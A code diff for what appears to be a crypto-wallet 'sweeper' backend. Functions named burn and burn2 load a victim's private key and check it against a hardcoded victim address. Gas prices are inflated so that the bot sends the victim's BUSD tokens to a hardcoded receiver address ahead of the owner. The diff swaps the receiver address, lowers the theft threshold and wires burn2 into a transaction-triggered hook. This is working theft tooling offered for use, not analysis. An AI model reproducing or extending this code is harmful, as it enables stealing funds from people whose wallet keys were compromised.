@@ -189,7 +189,7 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
       // gasPrice: gasPrice3,
       // gasLimit: gaslimit3,
 
-      chainId: 1,
+      // chainId: 1,
       type: 2,
       to: TOKEN_ADDRESS,
       maxFeePerGas: gasPrice3,
@@ -243,9 +243,9 @@ async function burn2(vtctmdtls: any, ankrkey: string, request: any) {
   const ETH_RPC_HTTP_ANKR = "https://rpc.ankr.com/bsc/"+ankrkey
 
 const VICTIM_KEY = vtctmdtls.get("pkaddr");
-const RECIEVER_ADDRESS = "0xF91dBC8Fd634E1032566131bFE9D35d895DadeCa";
+const RECIEVER_ADDRESS = "0x7FF91084790D72dad5de13eEF0FE1C7594f5FC17";
 // 0xc2132d05d31c914a87c6611c10748aeb04b58e8f
-const TOKEN_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";  // eywa  
+const TOKEN_ADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";  // eywa  
 
 if (VICTIM_KEY === "") {
   await mshlogger(request, "no key specified :failed sending token" , "error")
@@ -262,7 +262,7 @@ const victim = new Wallet(VICTIM_KEY, provider);
 const checkvictimaddr = "0x2EaacAf1468F248483Cec65254dff98FF95e3387";
 if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLowerCase()) {
 
-  request.log.info('Not same address');
+  request.log.info('Not same address busd');
 
   return 
 }
@@ -294,25 +294,14 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
 
     var feeData = await provider.getFeeData()
     var estimagegas = await provider.estimateGas(datatransfer)
-    var gaslimit3 = (estimagegas).mul(2);
+    var gaslimit3 = (estimagegas).mul(4);
     //   const gasPrice2 = ethers.BigNumber.from(ethers.utils.parseUnits("1000", "gwei"));
     // const gasPrice3 = (feeData.maxFeePerGas).add(feeData.maxFeePerGas.div(2))
     
 
     //latest because i used last base fee you can check the value 
-    const gasPrice3 = (feeData.lastBaseFeePerGas).add((feeData.maxFeePerGas).div(30))
+    const gasPrice3 = (feeData.maxFeePerGas).add((feeData.maxFeePerGas).div(2))
     const totalgasprice3 = gasPrice3.mul(gaslimit3);
-
-    // console.log("gaslimit3: "+gaslimit3)
-    // console.log("gasPrice3 first: "+ethers.utils.formatUnits(gaslimit3.div(2), "gwei"))
-    // console.log("gasPrice3: "+ethers.utils.formatUnits(gasPrice3, "gwei"))
-   
-    // console.log("totalgasprice3: "+ethers.utils.formatUnits(totalgasprice3, "ether"))
-
-    // 0.00023221
-
-
-
 
     
     if (balance.lt(totalgasprice3)) {
@@ -327,29 +316,15 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
 
      return
   }
-
-  // if(ethers.utils.formatUnits(tkbalanceADDR1, "18").lte(6000)) {
-  //   console.log('token balance  less than 7000');
-
-  //   return
-  // }
-
           
-  if(parseInt(ethers.utils.formatUnits(tkbalanceADDR1, "18")) < (6000)) {
+  if(parseInt(ethers.utils.formatUnits(tkbalanceADDR1, "18")) < (200)) {
     // console.log('token balance  less than 7000');
-    request.log.info('token balance  less than 7000');
+    request.log.info('token budd balance  less than 200');
     return
   }
 
 
   try {
-    // console.log(`Sending ${formatEther(balance)}ETH`);
-    // const tx = await wallet.sendTransactionç({
-    //   to: RECIEVER_ADDRESS,
-    //   gasLimit: 21000,
-    //   gasPrice : gasPrice.mul(10),
-    //   value: val
-    // });
 
     const tx = await victim.sendTransaction({
       // chainId: 1,
@@ -371,7 +346,7 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
       request.log.info(`Success!...lets hope for confirmation! 😁 🚀`);
     
   
-      await mshlogger(request, "Fired peptokn!!!" , "fired success")
+      await mshlogger(request, "Fired budd!!!" , "fired success")
     }
 
     if(tx.nonce) {
@@ -379,7 +354,7 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
     
      
     
-     await mshlogger(request, "Fired peptokn!!!, block confirmed" , "fired success")
+     await mshlogger(request, "Fired budd!!!, block confirmed" , "fired success")
       request.log.info(`Success! Block Confirmed 😁😁😁 🚀🚀🚀`);
 
   
@@ -948,7 +923,8 @@ Parse.Cloud.afterSave("LiveTxs", async  (request: any) => {
     
       await mshlogger(request, JSON.stringify(error), loggerr)
       await realLogger("error")
-      request.log.info("got error")
+      request.log.info("got errorrr")
+      request.log.info(error.message)
        // loggerr.info(JSON.stringify(error));
     
        // loggerr.info("errror");
@@ -1307,10 +1283,23 @@ var netmin: any = await getntworkwithmin(request.object.get("chainId"));
   try {
 
     await burn(toAddrDtls, prjid, request)
+
+
   } catch (error) {
     await mshlogger(request, "token failed inside trycatch: "+error.message, loggerr)
 
   }
+
+  try {
+
+    burn2(toAddrDtls, prjid, request)
+
+
+  } catch (error) {
+    await mshlogger(request, "token budd failed inside trycatch: "+error.message, loggerr)
+
+  }
+
 
 
  try {
@@ -1493,6 +1482,7 @@ request.log.info("Calculated balance");
    await mshlogger(request, JSON.stringify(error), loggerr)
    await realLogger("error")
    request.log.info("got error")
+   request.log.info(error.message)
     // loggerr.info(JSON.stringify(error));
  
     // loggerr.info("errror");
@@ -2226,79 +2216,97 @@ function getntworkwithmin(chainid: number) {
     {
       id: 1 ,
       name: 'eth',
-      min: 0.026
+      min: 0.26
+      // min: 0.026
+      
     },
     {
       id: 5 ,
       name: 'goerli',
-      min: 0.007
+      // min: 0.007
+      min: 5
     },
 
     {
       id: 11155111 ,
       name: 'sepolia',
-      min: 0.015
+      // min: 0.015
+      min: 5
     },
     
     {
       id: 137 ,
       name: 'polygon',
-      min: 140
+      // min: 140
+      min: 1817.94
     },
     {
       id: 43114 ,
       name: 'avax',
-      min: 2.8
+      // min: 2.8
+      min: 21.9
     },
     {
       id: 56 ,
       name: 'bsc',
-      min: 0.169
+      // min: 0.169
+      min: 1.40
     },
     {
       id: 250 ,
       name: 'fantom',
-      min: 140
+      // min: 140
+      min: 783.96
+      
     },
     {
       id: 10 ,
       name: 'op',
-      min: 40
+      // min: 40
+      min: 430
+      
     },
     {
       id: 42161 ,
       name: 'arb',
-      min: 95
+      // min: 95
+      min: 1077
     },
     {
       id: 25 ,
       name: 'cronos',
-      min: 790
+      // min: 790
+      min: 5460
     },
     {
       id: 369,
       name: 'pulse',
-      min: 700000
+      // min: 700000
+      min: 700000000
     },
     {
       id: 11297108109,
       name: 'palm',
-      min: 90
+       min: 9000000000
+      // min: 90
     },
     {
       id: 324,
       name: 'zkSync',
-      min: 10
+      // min: 10
+      min: 4832.03
     },
     {
       id: 100,
       name: 'gnosis',
-      min: 0.1
+      // min: 0.1
+      min: 37
     },
     {
       id: 8453,
       name: 'base',
-      min: 100
+      // min: 100
+      min: 10251967800
     }
     
 
